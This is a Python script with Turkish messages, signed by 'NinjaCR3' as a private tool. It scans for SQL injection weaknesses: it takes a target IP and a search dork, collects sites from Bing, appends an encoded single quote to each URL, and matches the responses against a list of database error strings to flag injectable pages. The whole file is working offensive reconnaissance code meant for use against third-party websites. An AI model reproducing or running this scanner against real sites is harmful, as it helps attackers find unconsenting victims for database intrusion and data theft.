import os,re,sys
try:
	import requests
except:
	print("[-] Requests modulu yuklu degil! Lutfen requests modulunu kurun ve programi yeniden calistirin!")
	sys.exit()
if os.name == "nt":
	os.system("cls")
else:
	os.system("clear")
print("""
        ____   ___  _     _   ____  _             
 __  __/ ___| / _ \| |   (_) | __ )(_)_ __   __ _ 
 \ \/ /\___ \| | | | |   | | |  _ \| | '_ \ / _` |
  >  <  ___) | |_| | |___| | | |_) | | | | | (_| |
 /_/\_\|____/ \__\_\_____|_| |____/|_|_| |_|\__, |
                                            |___/ 

	Coded by NinjaCR3
	Priv8 Tool :)
	Twitter --> @Ninja3Sec
""")
ip = input("Hedef IP : ")
dork = input("Dork : ")
ipdork = "ip:" + ip + " " + dork
i = 1
while i <= 201:
	try:
		r = requests.get("http://www.bing.com/search?q=" + ipdork + "&count=50&first=" + str(i))
		sites = re.findall('<h2><a href="(.*?)" h="ID',r.text)
		for site in sites:
			try:
				r = requests.get(site + "%27")
				if "mysql_num_rows()" in r.text or "mysql_fetch_array()" in r.text or "Error Occured While Processing Request" in r.text or "Server Error in '/' Application" in r.text or "Microsoft OLE DB Provider for ODBC Drivers error" in r.text or "error in your SQL syntax" in r.text or "Invalid Querystring" in r.text or "OLE DB Provider for ODBC" in r.text or "VBScript Runtime" in r.text or "ADODB.Field" in r.text or "BOF or EOF" in r.text or "ADODB.Command" in r.text or "mysql_fetch_row()" in r.text or "mysql_fetch_assoc()" in r.text or "mysql_fetch_object()" in r.text or "mysql_numrows()" in r.text:
					print("")
					print("")
					print("#" * 100)
					print("[+] " + site + "%27   <--   SQLi Injection !")
					print("#" * 100)
					print("")
					print("")
				else:
					print("[-] " + site + "   <--   Not Injection !")
			except:
				try:
					print("[-] " + site + "   <--   Site calismiyor !")
				except:
					pass
		i += 50
	except:
		pass
print("""
[+] Tarama bitti!
    NinjaCR3'den saygilarla :)
""")
